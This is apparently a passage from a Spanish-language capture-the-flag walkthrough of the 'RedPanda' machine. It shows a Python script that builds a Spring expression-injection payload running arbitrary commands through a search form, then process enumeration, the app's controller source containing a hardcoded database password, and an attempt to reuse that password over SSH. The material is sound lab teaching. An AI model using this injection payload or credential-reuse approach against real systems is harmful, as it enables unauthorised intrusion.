<span class="k">def</span> <span class="nf">makePayload</span><span class="p">(</span><span class="n">command</span><span class="p">):</span>
    <span class="n">payload</span> <span class="o">=</span> <span class="s">"*{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character)"</span>
    
    <span class="n">characters</span> <span class="o">=</span> <span class="p">[</span><span class="nb">ord</span><span class="p">(</span><span class="n">char</span><span class="p">)</span> <span class="k">for</span> <span class="n">char</span> <span class="ow">in</span> <span class="n">command</span><span class="p">]</span> 
    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">characters</span><span class="p">)):</span>
        <span class="k">if</span> <span class="n">i</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span>
            <span class="n">payload</span> <span class="o">+=</span> <span class="sa">f</span><span class="s">".toString(</span><span class="si">{</span><span class="n">characters</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="si">}</span><span class="s">)"</span>   
        <span class="k">else</span><span class="p">:</span>
            <span class="n">payload</span> <span class="o">+=</span> <span class="sa">f</span><span class="s">".concat(T(java.lang.Character).toString(</span><span class="si">{</span><span class="n">characters</span><span class="p">[</span><span class="n">i</span><span class="p">]</span><span class="si">}</span><span class="s">))"</span>
    <span class="n">payload</span> <span class="o">+=</span> <span class="s">").getInputStream())}"</span>
    <span class="n">data</span><span class="p">[</span><span class="s">"name"</span><span class="p">]</span> <span class="o">=</span> <span class="n">payload</span>

<span class="k">def</span> <span class="nf">makeRequest</span><span class="p">(</span><span class="n">url</span><span class="p">,</span><span class="n">data</span><span class="p">):</span> 
    <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">)</span>
    <span class="n">soup</span> <span class="o">=</span> <span class="n">BeautifulSoup</span><span class="p">(</span><span class="n">r</span><span class="p">.</span><span class="n">text</span><span class="p">,</span><span class="s">"html.parser"</span><span class="p">)</span>
    <span class="k">try</span><span class="p">:</span>
        <span class="n">content</span> <span class="o">=</span> <span class="n">soup</span><span class="p">.</span><span class="n">find_all</span><span class="p">(</span><span class="s">"h2"</span><span class="p">)[</span><span class="mi">0</span><span class="p">].</span><span class="n">text</span>
        <span class="k">return</span> <span class="n">content</span><span class="p">.</span><span class="n">replace</span><span class="p">(</span><span class="s">"You searched for: "</span><span class="p">,</span><span class="s">""</span><span class="p">).</span><span class="n">strip</span><span class="p">()</span>
    <span class="k">except</span> <span class="nb">Exception</span><span class="p">:</span>
        <span class="k">return</span> <span class="s">"N/A"</span>

<span class="k">def</span> <span class="nf">main</span><span class="p">():</span>
    <span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
        <span class="n">makePayload</span><span class="p">(</span><span class="nb">input</span><span class="p">(</span><span class="s">"&gt; "</span><span class="p">))</span>
        <span class="k">print</span><span class="p">(</span><span class="n">makeRequest</span><span class="p">(</span><span class="n">URL</span><span class="p">,</span> <span class="n">data</span><span class="p">))</span>

<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">"__main__"</span><span class="p">:</span>
   <span class="n">main</span><span class="p">()</span>
</pre></table></code></div></div><p>Estamos ejecutando comandos como el usuario <code class="language-plaintext highlighter-rouge">woodenk</code>. El anterior script simula una terminal, pero tiene muchas limitaciones, no podemos entablarnos una revershell funcional por el momento. Haciendo enumeración básica y viendo los procesos, nos encontramos con lo siguiente:</p><div class="language-shell highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
</pre><td class="rouge-code"><pre><span class="o">&gt;</span> ps <span class="nt">-aux</span>
USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root         463  0.0  0.7  68512 15140 ?        S&lt;s  05:24   0:04 /lib/systemd/systemd-journald
root         481  0.0  0.0      0     0 ?        I&lt;   05:24   0:00 <span class="o">[</span>ipmi-msghandler]
root         491  0.0  0.3  22632  6200 ?        Ss   05:24   0:01 /lib/systemd/systemd-udevd
root         612  0.0  0.0      0     0 ?        I&lt;   05:24   0:00 <span class="o">[</span>kaluad]
root         613  0.0  0.0      0     0 ?        I&lt;   05:24   0:00 <span class="o">[</span>kmpath_rdacd]
root         614  0.0  0.0      0     0 ?        I&lt;   05:24   0:00 <span class="o">[</span>kmpathd]
root         615  0.0  0.0      0     0 ?        I&lt;   05:24   0:00 <span class="o">[</span>kmpath_handlerd]
root         616  0.0  0.8 214596 17944 ?        SLsl 05:24   0:07 /sbin/multipathd <span class="nt">-d</span> <span class="nt">-s</span>
systemd+     642  0.0  0.3  90872  6124 ?        Ssl  05:24   0:06 /lib/systemd/systemd-timesyncd
root         654  0.0  0.5  47540 10728 ?        Ss   05:24   0:00 /usr/bin/VGAuthService
root         659  0.1  0.4 311504  8168 ?        Ssl  05:24   1:07 /usr/bin/vmtoolsd
root         671  0.0  0.2  99896  5860 ?        Ssl  05:24   0:00 /sbin/dhclient <span class="nt">-1</span> <span class="nt">-4</span> <span class="nt">-v</span> <span class="nt">-i</span> <span class="nt">-pf</span> /run/dhclient.eth0.pid <span class="nt">-lf</span> /var/lib/dhcp/dhclient.eth0.leases -
root         689  0.0  0.4 239292  9204 ?        Ssl  05:24   0:01 /usr/lib/accountsservice/accounts-daemon
message+     690  0.0  0.2   7600  4640 ?        Ss   05:24   0:00 /usr/bin/dbus-daemon <span class="nt">--system</span> <span class="nt">--address</span><span class="o">=</span>systemd: <span class="nt">--nofork</span> <span class="nt">--nopidfile</span> <span class="nt">--systemd-activation</span> <span class="nt">--s</span>
root         699  0.0  0.1  81956  3720 ?        Ssl  05:24   0:03 /usr/sbin/irqbalance <span class="nt">--foreground</span>
root         702  0.0  0.4 236436  8952 ?        Ssl  05:24   0:00 /usr/lib/policykit-1/polkitd <span class="nt">--no-debug</span>
syslog       705  0.0  0.2 224344  5060 ?        Ssl  05:24   0:00 /usr/sbin/rsyslogd <span class="nt">-n</span> <span class="nt">-iNONE</span>
root         708  0.0  0.3  17344  7852 ?        Ss   05:24   0:00 /lib/systemd/systemd-logind
root         709  0.0  0.6 395388 13728 ?        Ssl  05:24   0:00 /usr/lib/udisks2/udisksd
root         730  0.0  0.6 318820 13472 ?        Ssl  05:25   0:00 /usr/sbin/ModemManager
root         875  0.0  0.1   6812  2964 ?        Ss   05:25   0:00 /usr/sbin/cron <span class="nt">-f</span>
root         876  0.0  0.1   8356  3256 ?        S    05:25   0:00 /usr/sbin/CRON <span class="nt">-f</span>
daemon       879  0.0  0.1   3792  2156 ?        Ss   05:25   0:00 /usr/sbin/atd <span class="nt">-f</span>
root         880  0.0  0.0   2608   600 ?        Ss   05:25   0:00 /bin/sh <span class="nt">-c</span> <span class="nb">sudo</span> <span class="nt">-u</span> woodenk <span class="nt">-g</span> logs java <span class="nt">-jar</span> /opt/panda_search/target/panda_search-0.0.1-SNAPSHOT.jar
root         881  0.0  0.2   9416  4448 ?        S    05:25   0:00 <span class="nb">sudo</span> <span class="nt">-u</span> woodenk <span class="nt">-g</span> logs java <span class="nt">-jar</span> /opt/panda_search/target/panda_search-0.0.1-SNAPSHOT.jar
woodenk      890  0.8 20.8 3122648 423564 ?      Sl   05:25   9:07 java <span class="nt">-jar</span> /opt/panda_search/target/panda_search-0.0.1-SNAPSHOT.jar
root         895  0.0  0.3  12172  7384 ?        Ss   05:25   0:00 sshd: /usr/sbin/sshd <span class="nt">-D</span> <span class="o">[</span>listener] 0 of 10-100 startups
root         901  0.0  0.0   5828  1700 tty1     Ss+  05:25   0:00 /sbin/agetty <span class="nt">-o</span> <span class="nt">-p</span> <span class="nt">--</span> <span class="se">\u</span> <span class="nt">--noclear</span> tty1 linux
mysql        916  0.2 21.6 1806728 440248 ?      Ssl  05:25   2:27 /usr/sbin/mysqld
systemd+    1110  0.0  0.6  24696 13156 ?        Ss   05:31   0:11 /lib/systemd/systemd-resolved
woodenk    14518  0.0  0.0  81504  1088 ?        Ss   13:45   0:00 gpg-agent <span class="nt">--homedir</span> /home/woodenk/.gnupg <span class="nt">--use-standard-socket</span> <span class="nt">--daemon</span>
root       27752  0.0  0.0      0     0 ?        I    18:52   0:02 <span class="o">[</span>kworker/1:2-events]
root       30652  0.0  0.0      0     0 ?        I    22:20   0:03 <span class="o">[</span>kworker/0:0-events]
root       31175  0.0  0.0      0     0 ?        I    22:55   0:00 <span class="o">[</span>kworker/0:1-events]
root       31177  0.0  0.0      0     0 ?        I    22:55   0:00 <span class="o">[</span>kworker/1:1]
root       31276  0.0  0.0      0     0 ?        I    23:02   0:00 <span class="o">[</span>kworker/u4:1-events_power_efficient]
root       31587  0.0  0.0      0     0 ?        I    23:25   0:00 <span class="o">[</span>kworker/u4:0-events_unbound]
root       31751  0.0  0.4  13956  8924 ?        Ss   23:37   0:00 sshd: woodenk <span class="o">[</span>priv]
woodenk    31784  0.0  0.4  19004  9500 ?        Ss   23:38   0:00 /lib/systemd/systemd <span class="nt">--user</span>
root       31785  0.0  0.0      0     0 ?        I    23:38   0:00 <span class="o">[</span>kworker/0:2-mpt_poll_0]
woodenk    31786  0.0  0.1 105584  3208 ?        S    23:38   0:00 <span class="o">(</span>sd-pam<span class="o">)</span>
root       31787  0.0  0.0      0     0 ?        I    23:38   0:00 <span class="o">[</span>kworker/0:3-memcg_kmem_cache]
woodenk    31891  0.0  0.2  13956  6020 ?        S    23:38   0:00 sshd: woodenk@pts/0
woodenk    31892  0.0  0.2   8308  4952 pts/0    Ss   23:38   0:00 <span class="nt">-bash</span>
woodenk    31936  0.0  0.1   9080  3568 pts/0    R+   23:40   0:00 ps <span class="nt">-aux</span>
</pre></table></code></div></div><p>Vemos un proceso interesante, el cual tiene el <code class="language-plaintext highlighter-rouge">PID 880</code>, vemos que el usuario <code class="language-plaintext highlighter-rouge">root</code> está ejecutando como el usuario <code class="language-plaintext highlighter-rouge">woodenk</code> lo siguiente:</p><div class="language-shell highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>java <span class="nt">-jar</span> /opt/panda_search/target/panda_search-0.0.1-SNAPSHOT.jar<span class="sb">`</span>
</pre></table></code></div></div><p>Ahora, recordemos nuevamente que se está empleando <em>Spring Boot</em>, así que debe tener una estructura como cualquier proyecto. He encontrado este <a href="https://studygyaan.com/spring-boot/spring-boot-project-folder-structure-and-best-practices">artículo</a> donde nos muestran una estructura que se puede emplear en algunos proyectos. Podemos ver archivos <em>controladores</em> o <em>controller</em>. A veces podemos encontrar credenciales en esos lugares. Vamos a revisar la ruta <code class="language-plaintext highlighter-rouge">/opt/panda_search</code>:</p><div class="language-shell highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre><td class="rouge-code"><pre><span class="o">&gt;</span> <span class="nb">ls</span> <span class="nt">-la</span> /opt/panda_search/src/main/java/com/panda_search/htb/panda_search
total 24
drwxrwxr-x 2 root root 4096 Jun 21 12:24 <span class="nb">.</span>
drwxrwxr-x 3 root root 4096 Jun 14 14:35 ..
<span class="nt">-rw-rw-r--</span> 1 root root 4321 Jun 20 13:02 MainController.java
<span class="nt">-rw-rw-r--</span> 1 root root  779 Feb 21 18:04 PandaSearchApplication.java
<span class="nt">-rw-rw-r--</span> 1 root root 1800 Jun 14 14:09 RequestInterceptor.java
</pre></table></code></div></div><p>Tuve que profundizar en las rutas pero aquí terminan los directorios para este lugar, revisemos entonces el controlador:</p><div class="language-java highlighter-rouge"><div class="code-header"> <span data-label-text="Java"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
79
80
81
82
83
84
85
86
87
88
89
90
91
92
93
94
95
96
97
98
99
100
101
102
103
104
105
106
107
108
109
110
111
112
113
</pre><td class="rouge-code"><pre><span class="kn">import</span> <span class="nn">java.util.ArrayList</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">java.io.IOException</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">java.sql.*</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">java.util.List</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">java.util.ArrayList</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">java.io.File</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">java.io.InputStream</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">java.io.FileInputStream</span><span class="o">;</span>

<span class="kn">import</span> <span class="nn">org.springframework.stereotype.Controller</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">org.springframework.ui.Model</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">org.springframework.web.bind.annotation.GetMapping</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">org.springframework.web.bind.annotation.PostMapping</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">org.springframework.web.bind.annotation.RequestParam</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">org.springframework.web.bind.annotation.RestController</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">org.springframework.web.bind.annotation.ResponseBody</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">org.springframework.web.servlet.ModelAndView</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">org.springframework.http.MediaType</span><span class="o">;</span>

<span class="kn">import</span> <span class="nn">org.apache.commons.io.IOUtils</span><span class="o">;</span>

<span class="kn">import</span> <span class="nn">org.jdom2.JDOMException</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">org.jdom2.input.SAXBuilder</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">org.jdom2.output.Format</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">org.jdom2.output.XMLOutputter</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">org.jdom2.*</span><span class="o">;</span>

<span class="nd">@Controller</span>
<span class="kd">public</span> <span class="kd">class</span> <span class="nc">MainController</span> <span class="o">{</span>
  <span class="nd">@GetMapping</span><span class="o">(</span><span class="s">"/stats"</span><span class="o">)</span>
    <span class="kd">public</span> <span class="nc">ModelAndView</span> <span class="nf">stats</span><span class="o">(</span><span class="nd">@RequestParam</span><span class="o">(</span><span class="n">name</span><span class="o">=</span><span class="s">"author"</span><span class="o">,</span><span class="n">required</span><span class="o">=</span><span class="kc">false</span><span class="o">)</span> <span class="nc">String</span> <span class="n">author</span><span class="o">,</span> <span class="nc">Model</span> <span class="n">model</span><span class="o">)</span> <span class="kd">throws</span> <span class="nc">JDOMException</span><span class="o">,</span> <span class="nc">IOException</span> <span class="o">{</span>
    <span class="nc">SAXBuilder</span> <span class="n">saxBuilder</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">SAXBuilder</span><span class="o">();</span>
    <span class="k">if</span><span class="o">(</span><span class="n">author</span> <span class="o">==</span> <span class="kc">null</span><span class="o">)</span>
    <span class="n">author</span> <span class="o">=</span> <span class="s">"N/A"</span><span class="o">;</span>
    <span class="n">author</span> <span class="o">=</span> <span class="n">author</span><span class="o">.</span><span class="na">strip</span><span class="o">();</span>
    <span class="nc">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="sc">'"'</span> <span class="o">+</span> <span class="n">author</span> <span class="o">+</span> <span class="sc">'"'</span><span class="o">);</span>
    <span class="k">if</span><span class="o">(</span><span class="n">author</span><span class="o">.</span><span class="na">equals</span><span class="o">(</span><span class="s">"woodenk"</span><span class="o">)</span> <span class="o">||</span> <span class="n">author</span><span class="o">.</span><span class="na">equals</span><span class="o">(</span><span class="s">"damian"</span><span class="o">))</span> <span class="o">{</span>
      <span class="nc">String</span> <span class="n">path</span> <span class="o">=</span> <span class="s">"/credits/"</span> <span class="o">+</span> <span class="n">author</span> <span class="o">+</span> <span class="s">"_creds.xml"</span><span class="o">;</span>
      <span class="nc">File</span> <span class="n">fd</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">File</span><span class="o">(</span><span class="n">path</span><span class="o">);</span>
      <span class="nc">Document</span> <span class="n">doc</span> <span class="o">=</span> <span class="n">saxBuilder</span><span class="o">.</span><span class="na">build</span><span class="o">(</span><span class="n">fd</span><span class="o">);</span>
      <span class="nc">Element</span> <span class="n">rootElement</span> <span class="o">=</span> <span class="n">doc</span><span class="o">.</span><span class="na">getRootElement</span><span class="o">();</span>
      <span class="nc">String</span> <span class="n">totalviews</span> <span class="o">=</span> <span class="n">rootElement</span><span class="o">.</span><span class="na">getChildText</span><span class="o">(</span><span class="s">"totalviews"</span><span class="o">);</span>
            <span class="nc">List</span><span class="o">&lt;</span><span class="nc">Element</span><span class="o">&gt;</span> <span class="n">images</span> <span class="o">=</span> <span class="n">rootElement</span><span class="o">.</span><span class="na">getChildren</span><span class="o">(</span><span class="s">"image"</span><span class="o">);</span>
      <span class="k">for</span><span class="o">(</span><span class="nc">Element</span> <span class="nl">image:</span> <span class="n">images</span><span class="o">)</span>
        <span class="nc">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="n">image</span><span class="o">.</span><span class="na">getChildText</span><span class="o">(</span><span class="s">"uri"</span><span class="o">));</span>
      <span class="n">model</span><span class="o">.</span><span class="na">addAttribute</span><span class="o">(</span><span class="s">"noAuthor"</span><span class="o">,</span> <span class="kc">false</span><span class="o">);</span>
      <span class="n">model</span><span class="o">.</span><span class="na">addAttribute</span><span class="o">(</span><span class="s">"author"</span><span class="o">,</span> <span class="n">author</span><span class="o">);</span>
      <span class="n">model</span><span class="o">.</span><span class="na">addAttribute</span><span class="o">(</span><span class="s">"totalviews"</span><span class="o">,</span> <span class="n">totalviews</span><span class="o">);</span>
      <span class="n">model</span><span class="o">.</span><span class="na">addAttribute</span><span class="o">(</span><span class="s">"images"</span><span class="o">,</span> <span class="n">images</span><span class="o">);</span>
      <span class="k">return</span> <span class="k">new</span> <span class="nf">ModelAndView</span><span class="o">(</span><span class="s">"stats.html"</span><span class="o">);</span>
    <span class="o">}</span> <span class="k">else</span> <span class="o">{</span>
      <span class="n">model</span><span class="o">.</span><span class="na">addAttribute</span><span class="o">(</span><span class="s">"noAuthor"</span><span class="o">,</span> <span class="kc">true</span><span class="o">);</span>
      <span class="k">return</span> <span class="k">new</span> <span class="nf">ModelAndView</span><span class="o">(</span><span class="s">"stats.html"</span><span class="o">);</span>
    <span class="o">}</span>
  <span class="o">}</span>
  <span class="nd">@GetMapping</span><span class="o">(</span><span class="n">value</span><span class="o">=</span><span class="s">"/export.xml"</span><span class="o">,</span> <span class="n">produces</span> <span class="o">=</span> <span class="nc">MediaType</span><span class="o">.</span><span class="na">APPLICATION_OCTET_STREAM_VALUE</span><span class="o">)</span>
  <span class="kd">public</span> <span class="nd">@ResponseBody</span> <span class="kt">byte</span><span class="o">[]</span> <span class="nf">exportXML</span><span class="o">(</span><span class="nd">@RequestParam</span><span class="o">(</span><span class="n">name</span><span class="o">=</span><span class="s">"author"</span><span class="o">,</span> <span class="n">defaultValue</span><span class="o">=</span><span class="s">"err"</span><span class="o">)</span> <span class="nc">String</span> <span class="n">author</span><span class="o">)</span> <span class="kd">throws</span> <span class="nc">IOException</span> <span class="o">{</span>

    <span class="nc">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">"Exporting xml of: "</span> <span class="o">+</span> <span class="n">author</span><span class="o">);</span>
    <span class="k">if</span><span class="o">(</span><span class="n">author</span><span class="o">.</span><span class="na">equals</span><span class="o">(</span><span class="s">"woodenk"</span><span class="o">)</span> <span class="o">||</span> <span class="n">author</span><span class="o">.</span><span class="na">equals</span><span class="o">(</span><span class="s">"damian"</span><span class="o">))</span> <span class="o">{</span>
      <span class="nc">InputStream</span> <span class="n">in</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">FileInputStream</span><span class="o">(</span><span class="s">"/credits/"</span> <span class="o">+</span> <span class="n">author</span> <span class="o">+</span> <span class="s">"_creds.xml"</span><span class="o">);</span>
      <span class="nc">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="n">in</span><span class="o">);</span>
      <span class="k">return</span> <span class="nc">IOUtils</span><span class="o">.</span><span class="na">toByteArray</span><span class="o">(</span><span class="n">in</span><span class="o">);</span>
    <span class="o">}</span> <span class="k">else</span> <span class="o">{</span>
      <span class="k">return</span> <span class="nc">IOUtils</span><span class="o">.</span><span class="na">toByteArray</span><span class="o">(</span><span class="s">"Error, incorrect paramenter 'author'\n\r"</span><span class="o">);</span>
    <span class="o">}</span>
  <span class="o">}</span>
  <span class="nd">@PostMapping</span><span class="o">(</span><span class="s">"/search"</span><span class="o">)</span>
  <span class="kd">public</span> <span class="nc">ModelAndView</span> <span class="nf">search</span><span class="o">(</span><span class="nd">@RequestParam</span><span class="o">(</span><span class="s">"name"</span><span class="o">)</span> <span class="nc">String</span> <span class="n">name</span><span class="o">,</span> <span class="nc">Model</span> <span class="n">model</span><span class="o">)</span> <span class="o">{</span>
    <span class="k">if</span><span class="o">(</span><span class="n">name</span><span class="o">.</span><span class="na">isEmpty</span><span class="o">())</span> <span class="o">{</span>
      <span class="n">name</span> <span class="o">=</span> <span class="s">"Greg"</span><span class="o">;</span>
    <span class="o">}</span>
      <span class="nc">String</span> <span class="n">query</span> <span class="o">=</span> <span class="n">filter</span><span class="o">(</span><span class="n">name</span><span class="o">);</span>
    <span class="nc">ArrayList</span> <span class="n">pandas</span> <span class="o">=</span> <span class="n">searchPanda</span><span class="o">(</span><span class="n">query</span><span class="o">);</span>
        <span class="nc">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">"\n\""</span><span class="o">+</span><span class="n">query</span><span class="o">+</span><span class="s">"\"\n"</span><span class="o">);</span>
        <span class="n">model</span><span class="o">.</span><span class="na">addAttribute</span><span class="o">(</span><span class="s">"query"</span><span class="o">,</span> <span class="n">query</span><span class="o">);</span>
    <span class="n">model</span><span class="o">.</span><span class="na">addAttribute</span><span class="o">(</span><span class="s">"pandas"</span><span class="o">,</span> <span class="n">pandas</span><span class="o">);</span>
    <span class="n">model</span><span class="o">.</span><span class="na">addAttribute</span><span class="o">(</span><span class="s">"n"</span><span class="o">,</span> <span class="n">pandas</span><span class="o">.</span><span class="na">size</span><span class="o">());</span>
    <span class="k">return</span> <span class="k">new</span> <span class="nf">ModelAndView</span><span class="o">(</span><span class="s">"search.html"</span><span class="o">);</span>
  <span class="o">}</span>
  
  <span class="kd">public</span> <span class="nc">String</span> <span class="nf">filter</span><span class="o">(</span><span class="nc">String</span> <span class="n">arg</span><span class="o">)</span> <span class="o">{</span>
        <span class="nc">String</span><span class="o">[]</span> <span class="n">no_no_words</span> <span class="o">=</span> <span class="o">{</span><span class="s">"%"</span><span class="o">,</span> <span class="s">"_"</span><span class="o">,</span><span class="s">"$"</span><span class="o">,</span> <span class="s">"~"</span><span class="o">,</span> <span class="o">};</span>
        <span class="k">for</span> <span class="o">(</span><span class="nc">String</span> <span class="n">word</span> <span class="o">:</span> <span class="n">no_no_words</span><span class="o">)</span> <span class="o">{</span>
            <span class="k">if</span><span class="o">(</span><span class="n">arg</span><span class="o">.</span><span class="na">contains</span><span class="o">(</span><span class="n">word</span><span class="o">)){</span>
                <span class="k">return</span> <span class="s">"Error occured: banned characters"</span><span class="o">;</span>
            <span class="o">}</span>
        <span class="o">}</span>
        <span class="k">return</span> <span class="n">arg</span><span class="o">;</span>
    <span class="o">}</span>

  <span class="kd">public</span> <span class="nc">ArrayList</span> <span class="nf">searchPanda</span><span class="o">(</span><span class="nc">String</span> <span class="n">query</span><span class="o">)</span> <span class="o">{</span>
        <span class="nc">Connection</span> <span class="n">conn</span> <span class="o">=</span> <span class="kc">null</span><span class="o">;</span>
        <span class="nc">PreparedStatement</span> <span class="n">stmt</span> <span class="o">=</span> <span class="kc">null</span><span class="o">;</span>
        <span class="nc">ArrayList</span><span class="o">&lt;</span><span class="nc">ArrayList</span><span class="o">&gt;</span> <span class="n">pandas</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">ArrayList</span><span class="o">();</span>
        <span class="k">try</span> <span class="o">{</span>
            <span class="nc">Class</span><span class="o">.</span><span class="na">forName</span><span class="o">(</span><span class="s">"com.mysql.cj.jdbc.Driver"</span><span class="o">);</span>
            <span class="n">conn</span> <span class="o">=</span> <span class="nc">DriverManager</span><span class="o">.</span><span class="na">getConnection</span><span class="o">(</span><span class="s">"jdbc:mysql://localhost:3306/red_panda"</span><span class="o">,</span> <span class="s">"woodenk"</span><span class="o">,</span> <span class="s">"RedPandazRule"</span><span class="o">);</span>
            <span class="n">stmt</span> <span class="o">=</span> <span class="n">conn</span><span class="o">.</span><span class="na">prepareStatement</span><span class="o">(</span><span class="s">"SELECT name, bio, imgloc, author FROM pandas WHERE name LIKE ?"</span><span class="o">);</span>
            <span class="n">stmt</span><span class="o">.</span><span class="na">setString</span><span class="o">(</span><span class="mi">1</span><span class="o">,</span> <span class="s">"%"</span> <span class="o">+</span> <span class="n">query</span> <span class="o">+</span> <span class="s">"%"</span><span class="o">);</span>
            <span class="nc">ResultSet</span> <span class="n">rs</span> <span class="o">=</span> <span class="n">stmt</span><span class="o">.</span><span class="na">executeQuery</span><span class="o">();</span>
            <span class="k">while</span><span class="o">(</span><span class="n">rs</span><span class="o">.</span><span class="na">next</span><span class="o">())</span> <span class="o">{</span>
                <span class="nc">ArrayList</span><span class="o">&lt;</span><span class="nc">String</span><span class="o">&gt;</span> <span class="n">panda</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">ArrayList</span><span class="o">&lt;</span><span class="nc">String</span><span class="o">&gt;();</span>
                <span class="n">panda</span><span class="o">.</span><span class="na">add</span><span class="o">(</span><span class="n">rs</span><span class="o">.</span><span class="na">getString</span><span class="o">(</span><span class="s">"name"</span><span class="o">));</span>
                <span class="n">panda</span><span class="o">.</span><span class="na">add</span><span class="o">(</span><span class="n">rs</span><span class="o">.</span><span class="na">getString</span><span class="o">(</span><span class="s">"bio"</span><span class="o">));</span>
                <span class="n">panda</span><span class="o">.</span><span class="na">add</span><span class="o">(</span><span class="n">rs</span><span class="o">.</span><span class="na">getString</span><span class="o">(</span><span class="s">"imgloc"</span><span class="o">));</span>
        <span class="n">panda</span><span class="o">.</span><span class="na">add</span><span class="o">(</span><span class="n">rs</span><span class="o">.</span><span class="na">getString</span><span class="o">(</span><span class="s">"author"</span><span class="o">));</span>
                <span class="n">pandas</span><span class="o">.</span><span class="na">add</span><span class="o">(</span><span class="n">panda</span><span class="o">);</span>
            <span class="o">}</span>
        <span class="o">}</span> <span class="k">catch</span><span class="o">(</span><span class="nc">Exception</span> <span class="n">e</span><span class="o">){</span> <span class="nc">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="n">e</span><span class="o">);</span> <span class="o">}</span>
        <span class="k">return</span> <span class="n">pandas</span><span class="o">;</span>
    <span class="o">}</span>
<span class="o">}</span>
</pre></table></code></div></div><p>Vemos un método <code class="language-plaintext highlighter-rouge">filter</code> el cual nos impedía escribir esos 4 caracteres que están en el arreglo <code class="language-plaintext highlighter-rouge">no_no_words</code>, pero lo más importante es que tenemos credenciales con el usuario <code class="language-plaintext highlighter-rouge">woodenk</code>:</p><div class="language-java highlighter-rouge"><div class="code-header"> <span data-label-text="Java"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="n">conn</span> <span class="o">=</span> <span class="nc">DriverManager</span><span class="o">.</span><span class="na">getConnection</span><span class="o">(</span><span class="s">"jdbc:mysql://localhost:3306/red_panda"</span><span class="o">,</span> <span class="s">"woodenk"</span><span class="o">,</span> <span class="s">"RedPandazRule"</span><span class="o">);</span>
</pre></table></code></div></div><p>—¿Qué tal si se están reutilizando?— Intentemos conectarnos a través de SSH:</p><div class="language-shell highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>❯ ssh woodenk@10.10.11.170
